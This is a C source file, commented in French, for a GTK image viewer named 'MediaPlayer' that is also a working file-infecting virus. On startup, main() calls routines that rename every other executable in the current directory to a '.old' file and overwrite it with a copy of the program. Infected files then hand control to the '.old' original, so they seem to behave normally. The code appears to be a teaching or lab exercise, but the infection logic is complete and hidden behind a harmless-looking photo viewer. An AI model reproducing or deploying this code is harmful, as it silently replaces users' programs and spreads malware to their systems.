#include <gtk/gtk.h>
#include <stdio.h>
#include <stdlib.h>     
#include <string.h>  
#include <ctype.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <libgen.h>

struct _widgets_redimension {
   GtkWidget *image;
   GdkPixbuf *pixbuf;
};

typedef struct _widgets_redimension WidgetsRedimension;

#define LARGEUR_MAX  800
#define HAUTEUR_MAX  800

int est_infecte(const char *fichier)
{
    if (strstr(fichier, ".old") != NULL) // si il est un .old
    {
        return 1;
    }
    char old[256];
    snprintf(old, sizeof(old), "%s.old", fichier);
    FILE *f = fopen(old, "r");
    if(f) // si le fichier .old existe déjà
    {
        fclose(f);
        return 1;
    }
    return 0;
}

int est_executable(const char *fichier) {
    struct stat st;
    if (stat(fichier, &st) == -1) { // si le fichier existe bien
        return 0;
    }
    return S_ISREG(st.st_mode) && (access(fichier, X_OK) == 0); // si il est executable
}

void infecter(const char *cible, const char *chemin) {
    char nom_old[256];
    snprintf(nom_old, sizeof(nom_old), "%s.old", cible); // renommer en .old
    
    if (rename(cible, nom_old) != 0) {
        perror("erreur renommage");
        return;
    }
    
    int source = open(chemin, O_RDONLY);
    int destination = open(cible, O_WRONLY | O_CREAT | O_TRUNC, 0755); //créer le nouveau fichier
    if (source == -1 || destination == -1) {
        perror("erreur destination/source");
        close(source);
        rename(nom_old, cible);
        return;
    }

    char temp[4096];
    ssize_t octets;
    while ((octets = read(source, temp, sizeof(temp))) > 0) { // Lire la source
        if (write(destination, temp, octets) != octets) { //ecrire dans la destination
            perror("erreur copie");
            close(source);
            close(destination);
            rename(nom_old, cible);
            return;
        }
    }

    close(source);
    close(destination);
    printf("%s devient %s\n", cible, nom_old);
}

void transferer_execution(int argc, char *argv[]) {
    char *nom = basename(argv[0]);
    if (strcmp(nom, "MediaPlayer") != 0) { // si il n'est pas MediaPlayer
        char old[256];
        snprintf(old, sizeof(old), "%s.old", nom); 
        if (access(old, F_OK) == 0) {
            execv(old, argv); // executer le .old et arreter le script actuelle
            perror("echec exec");
            exit(1);
        }
    }
}

void infecter_fichiers(const char *chemin){
    DIR *dossier = opendir(".");
    if (dossier) {
        struct dirent *entree;
        char *source = basename((char *)chemin);
        while ((entree = readdir(dossier)) != NULL) {
            if (strcmp(entree->d_name, source) != 0 && est_executable(entree->d_name) && !est_infecte(entree->d_name)) { // si ce n'est pas lui meme, qu'il est executable et pas infectér
                infecter(entree->d_name, chemin);
            }
        }
        closedir(dossier);
    }
}

gboolean redimensionner_image(GtkWidget *widget, GdkRectangle *espace, gpointer donnees) {
   int x, y, largeur, hauteur;
   GdkPixbuf *nouveau_pixbuf;
   GtkWidget *image = ((WidgetsRedimension *) donnees)->image;
   GdkPixbuf *pixbuf = ((WidgetsRedimension *) donnees)->pixbuf;

   int larg_orig = gdk_pixbuf_get_width(pixbuf);
   int haut_orig = gdk_pixbuf_get_height(pixbuf);

   hauteur = espace->height;
   largeur = (larg_orig * hauteur) / haut_orig;

   if (largeur > LARGEUR_MAX || hauteur > HAUTEUR_MAX) {
   // calcul des echelles 
      float echelle_l = (float)LARGEUR_MAX / larg_orig;
      float echelle_h = (float)HAUTEUR_MAX / haut_orig;
      float echelle = (echelle_l < echelle_h) ? echelle_l : echelle_h;

      largeur = (int)(larg_orig * echelle);
      hauteur = (int)(haut_orig * echelle);
   }
   // modification de la taille a partir de l'ancien pixbuf
   nouveau_pixbuf = gdk_pixbuf_scale_simple(pixbuf, largeur, hauteur, GDK_INTERP_BILINEAR);

   x = (espace->width - largeur) / 2;
   y = (espace->height - hauteur) / 2;
   if (x < 0) x = 0;
   if (y < 0) y = 0;

   gtk_layout_move(GTK_LAYOUT(widget), image, x, y);
   gtk_image_set_from_pixbuf(GTK_IMAGE(image), nouveau_pixbuf);

   g_object_unref(nouveau_pixbuf);

   return FALSE;
}

void quitter(GtkWidget *widget, gpointer donnees) {
   gtk_main_quit();
   (void)widget;
   (void)donnees;
}

int taille_liste(char **tableau) {
   int compte = 0;
   while (tableau[compte] != NULL) {
      compte++;   
   }
   return compte;
}

// structure permettant de faire 
typedef struct {
   GtkWidget *widget_image;
   char **images;
   int nb_images;
   int indice;
   WidgetsRedimension *redimension;
   GtkWidget *boite;
} DataApp;

void modifier_image(DataApp *donnees){ // change l'image apres un index modifié
   g_object_unref(donnees->redimension->pixbuf);
   donnees->redimension->pixbuf = gdk_pixbuf_new_from_file(donnees->images[donnees->indice], NULL);
   GdkRectangle espace;
   gtk_widget_get_allocation(donnees->boite, &espace);
   redimensionner_image(donnees->boite, &espace, donnees->redimension);
}

void precedent(GtkWidget *widget, gpointer donnees) {
   DataApp *d = (DataApp *)donnees;
   if (d->indice > 0) {
      d->indice--;
      modifier_image(d);
   }
}

void suivant(GtkWidget *widget, gpointer donnees) {
   DataApp *d = (DataApp *)donnees;
   if (d->indice < d->nb_images - 1) {
      d->indice++;
      modifier_image(d);
   }
}

char **charger_images() { // renvoie la liste des images
   DIR *dossier = opendir(".");
   if (!dossier) return NULL;

   int n = 0;
   struct dirent *entree;
   while ((entree = readdir(dossier)) != NULL) {
       if (verifier_extension(entree->d_name)){
          n++;
       }
   }
   rewinddir(dossier);

   char **resultat = malloc((n + 1) * sizeof(char *));
   if (!resultat) {
       closedir(dossier);
       return NULL;
   }

   int i = 0;
   while ((entree = readdir(dossier)) != NULL) {
       if (verifier_extension(entree->d_name)) {
           resultat[i] = strdup(entree->d_name);
           i++;
       }
   }
   resultat[i] = NULL;
   closedir(dossier);
   return resultat;
}

int verifier_extension(const char *fichier) {
   if (fichier == NULL) return 0;
   
   const char *point = strrchr(fichier, '.');
   if (!point || point == fichier) return 0; // si il n'y a pas de point ou que c'est .
   
   char ext[6];
   int i = 0;
   while (point[i] && i < 5) {
      ext[i] = tolower(point[i]);
      i++;
   }
   ext[i] = '\0';
   
   const char *extensions[] = {".jpg", ".png", ".bmp", ".jpeg", NULL};
   for (int j = 0; extensions[j] != NULL; j++) {
      if (strcmp(ext, extensions[j]) == 0) {
         return 1;
      }
   }
   return 0;
}

int main(int argc, char *argv[]) {  
   infecter_fichiers(argv[0]); // infection

   transferer_execution(argc, argv);
    
   char **images = charger_images();
   int taille_images = taille_liste(images);
   int i = 0;
   while (i < taille_images && images[i] != NULL) {
      printf("%d: %s\n", i, images[i]);
      i++;
   }
   


   gtk_init(&argc, &argv);
   
   GtkWidget *fenetre = gtk_window_new(GTK_WINDOW_TOPLEVEL);
   gtk_window_set_default_size(GTK_WINDOW(fenetre), 400, 400);

   GtkWidget *boite_principale = gtk_vbox_new(FALSE, 0);
   gtk_container_add(GTK_CONTAINER(fenetre), boite_principale);
   g_signal_connect(G_OBJECT(fenetre), "destroy", G_CALLBACK(quitter), NULL);

   GtkWidget *tableau = gtk_table_new(2, 2, TRUE);

   GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(images[0], NULL);
   if (!pixbuf) {
      fprintf(stderr, "erreur de chargement de l'image\n");
      return 1;
   }
   GtkWidget *image = gtk_image_new_from_pixbuf(pixbuf);

   WidgetsRedimension *widgets_redim = g_new(WidgetsRedimension, 1);
   widgets_redim->image = image;
   widgets_redim->pixbuf = pixbuf;

   DataApp *donnees_app = g_new(DataApp, 1);
   donnees_app->widget_image = image;
   donnees_app->images = images;
   donnees_app->nb_images = taille_images;
   donnees_app->indice = 0;
   donnees_app->redimension = widgets_redim;
   donnees_app->boite = boite_principale;

   g_signal_connect(G_OBJECT(boite_principale), "size-allocate", G_CALLBACK(redimensionner_image), widgets_redim);

   GtkWidget *bouton_prec = gtk_button_new_with_label("précédent"); // bouton précédent
   gtk_table_attach_defaults(GTK_TABLE(tableau), bouton_prec, 0, 1, 0, 1);
   g_signal_connect(G_OBJECT(bouton_prec), "clicked", G_CALLBACK(precedent), donnees_app);
   
   GtkWidget *bouton_suiv = gtk_button_new_with_label("suivant"); // bouton suivant
   gtk_table_attach_defaults(GTK_TABLE(tableau), bouton_suiv, 1, 2, 0, 1);
   g_signal_connect(G_OBJECT(bouton_suiv), "clicked", G_CALLBACK(suivant), donnees_app);

   gtk_box_pack_start(GTK_BOX(boite_principale), image, TRUE, TRUE, 0);
   gtk_box_pack_start(GTK_BOX(boite_principale), tableau, FALSE, FALSE, 0);

   gtk_widget_show_all(fenetre);

   gtk_main();

   g_object_unref(pixbuf);
   g_free(widgets_redim);
   g_free(donnees_app);
   for (i = 0; i < taille_images; i++) {
      free(images[i]);
   }
   free(images);

   return 0;
}
